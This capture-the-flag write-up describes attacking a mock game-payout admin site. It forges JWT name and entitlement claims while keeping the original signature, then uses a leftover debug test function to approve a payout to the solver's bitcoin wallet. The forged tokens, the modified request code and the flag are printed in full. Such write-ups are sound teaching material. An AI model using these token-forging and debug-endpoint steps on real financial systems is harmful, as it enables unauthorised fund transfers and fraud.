# T2O1: Financial Fiasco

## Problem Description
You've gained access to one of Lucky Lions game payout administration platforms with a session token lifted from a privledged user. It looks like this application was pretty hastily put together... I wonder what other things might be left behind?

### Resources

- Auth Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhcHAiOiJQYXlvdXQgQXBwIiwibmFtZSI6ImFkbWluIiwiZW50aXRsZW1lbnRzIjoiQURNSU4tVVNFUi1QUk9EIn0.MSKbQJWjxULLDjLiGXUtO5KQjtmHPXqESvzkXq1DvtU

- Bitcoin wallet address: 1Dc8bLshoiJcV4h5fAJz4JZGiWpmgQ7EMc

- http://target-jwt.chals.io/

## Objectives
Retreive the flag by successfully sending funds to your bitcoin wallet.

## Approach and Solution
When we follow the link given, we are met with this page:
![Home Page](img/o1-1.png)

A couple of things become apparent to us as we explore a little bit. First, the Admin button does nothing and also goes to nothing. Second, all of the games have the exact same interface displaying the exact same information.
![Game Page](img/o1-2.png)

Now, we go into the Developer tools, where we can inspect the elements. There, we see a file: `scripts.js`.

Awesome! We can assume that we can perhaps interact with the webpage this way. [Link to the script.](resources/o1-scripts.js)

We see immediately at the top that there is a section that reads:

```
textContent = {
    currentFunds: '1000000',
    winningUser: 'John Abernathy',
    pendingPayout: '334',
    payoutAccount: '12347878412323478979123431347893478'
};
```

So it is clear that we need to change the payoutAccount to our Bitcoin wallet address. How do we do that? Looking deeper into the JS, we see a function to update content:

```
function updateContent(content) {
    textContent.currentFunds = content.currentFunds;
    textContent.winningUser = content.winningUser;
    textContent.pendingPayout = content.pendingPayout;
    textContent.payoutAccount = content.payoutAccount; //this needs to be a hidden form field
    document.getElementById('currentFunds').textContent = "Current Funds: $" + textContent.currentFunds;
    document.getElementById('winningUser').textContent = "Winning User: " + textContent.winningUser;
    document.getElementById('pendingPayout').textContent = "Payout Amount: $" + textContent.pendingPayout;
    document.getElementById('payoutAccount').textContent = textContent.payoutAccount;
}
```

And, interestingly enough, there is a comment that says that the payout account should be hidden. Now we know the command to update our payout account: `textContent.payoutAccount = '1Dc8bLshoiJcV4h5fAJz4JZGiWpmgQ7EMc'`.

But that's not enough! This will not successfully send a payout to us. However, deeper in the JS file, we see this function:

```
/*
** remove before deployment**
function testFunction() {
    const xhr = new XMLHttpRequest();
    xhr.open('POST', base_url + '/api/v1/test', true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.setRequestHeader('Authorization', 'bearer xxxx'); //replace with bearer with the fin entitlement
    xhr.onreadystatechange = function() {
        if (this.readyState === XMLHttpRequest.DONE && this.status === 200) {
            xhr.send(JSON.stringify({operation: 'decline'}));
            showPopupMessage(JSON.stringify(content), 10000); //puts the content of the response in the popup window, after converting to a string
        } else if (this.readyState === XMLHttpRequest.DONE) {
            showPopupMessage("Application Issue", 1000); // 20 seconds?? 
        }
    };
    xhr.send(JSON.stringify({operation: 'decline'}));
}
*/
```

Now this is interesting! Why would this function be commented out? Why does it need to be removed before deployment? Well, if we look closely at the code, it seems that it allows us to arbitrarily send requests to any operation of our choice--as long as we have the correct authorization.

We can see our current (or default) authorization in all the other functions of the JS file.

`bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhcHAiOiJQYXlvdXQgQXBwIiwibmFtZSI6ImFkbWluIiwiZW50aXRsZW1lbnRzIjoiQURNSU4tVVNFUi1QUk9EIn0.MSKbQJWjxULLDjLiGXUtO5KQjtmHPXqESvzkXq1DvtU`

Let's just test the function with this auth token first.

To run this code, all we have to do is just copy and paste it into the console and then call it.

![Running the function](img/o1-3.png)

Whoa! We get a 401 Unauthorized error. So we need to look futher at our auth token.

From just a glance, we can tell this is probably a JWT token (the base64, the eyJ opening sequence, and the various periods separating the content give it away). We use our trust JWT decoder to see what the JWT token consists of.

![JWT decoded](img/o1-4.png)

Header aside, the most important parts of this look to be the name and the entitlements. But what should those values be?

Let's look at the testFunction again. In the comment for the authorization header, the comment reads:

`//replace with bearer with the fin entitilement`

Great. So let's modify our JWT token to include the fin entitlement. All we do is add '-FIN' to the entitlements key under Payload. Now let's run our testFunction again.

![Modified run](img/o1-5.png)

Hmm. We still get a 401 Unauthorized. Going over to the Network tab and looking at the request, we see an error being thrown in the response:

`{error: "*Breakpoint 3* not the finanace user"}`

Okay. So it looks like we need to set the user to `finance` instead of `admin`. Let's reforge the JWT token again. This time, we get another, different error:
`{error: "*Breakpoint 4* Needs FIN-USER-PROD entitlement"}`

So let's set the entitlements to those. Running it this time with the JWT token `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhcHAiOiJQYXlvdXQgQXBwIiwibmFtZSI6ImZpbmFuY2UiLCJlbnRpdGxlbWVudHMiOiJGSU4tVVNFUi1QUk9EIn0.MSKbQJWjxULLDjLiGXUtO5KQjtmHPXqESvzkXq1DvtU` yields a 404 Not Found.

This is actually great news! It means that even though the "decline" endpoint doesn't exist, we have passed the correct auth token. So all we need to do is to edit the testFunction to approve the payout instead of declining it.

After a few more rounds of reading the errors and adjusting as needed, we finally hit upon the right function:

```
function testFunction() {
    const xhr = new XMLHttpRequest();
    xhr.open('POST', base_url + '/api/v1/test', true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.setRequestHeader('Authorization', 'bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhcHAiOiJQYXlvdXQgQXBwIiwibmFtZSI6ImZpbmFuY2UiLCJlbnRpdGxlbWVudHMiOiJGSU4tVVNFUi1QUk9EIn0.MSKbQJWjxULLDjLiGXUtO5KQjtmHPXqESvzkXq1DvtU'); //replace with bearer with the fin entitlement
    xhr.onreadystatechange = function() {
        if (this.readyState === XMLHttpRequest.DONE && this.status === 200) {
            xhr.send(JSON.stringify({operation: 'approve'}));
            showPopupMessage(JSON.stringify(content), 10000); //puts the content of the response in the popup window, after converting to a string
        } else if (this.readyState === XMLHttpRequest.DONE) {
            showPopupMessage("Application Issue", 1000); // 20 seconds?? 
        }
    };
    xhr.send(JSON.stringify({operation: 'approve', payoutAccount: textContent.payoutAccount}));
}
```
and calling this function with testFunction() gives us the flag as the network response!

`{flag: "wicys{C13@n_Up_0n_aSiLe_5}"}`


## Rabbit Holes
No real rabbit holes for this one. Although there were a few steps to get to the flag, it was pretty straightforward once we found the testFunction.
